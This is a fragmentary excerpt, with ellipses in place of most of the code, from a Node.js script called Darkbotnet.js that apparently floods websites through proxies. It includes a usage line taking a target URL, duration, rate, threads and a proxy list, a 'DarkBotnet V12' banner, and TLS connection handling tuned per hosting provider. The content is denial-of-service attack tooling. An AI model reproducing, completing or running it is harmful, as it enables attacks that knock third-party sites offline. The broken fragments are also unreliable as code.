...
const secureOptions = 
 ...
 if (process.argv.length < 7){console.log(`node Darkbotnet.js https://google.com/ 60 64 10 proxy.txt `); process.exit();}
...
if (cluster.isMaster) {
    console.clear();
    console.log(`DarkBotnet`.bgRed), console.log(`V12`);
    console.log(`--------------------------------------------`.gray);
...
tlsSocket.on('connect', () => {
    ...
    break;
        ...
        case 'Google LLC':
            ...
            break;
            case 'Alibaba Cloud Computing Ltd.':
    settings.priority = 1;
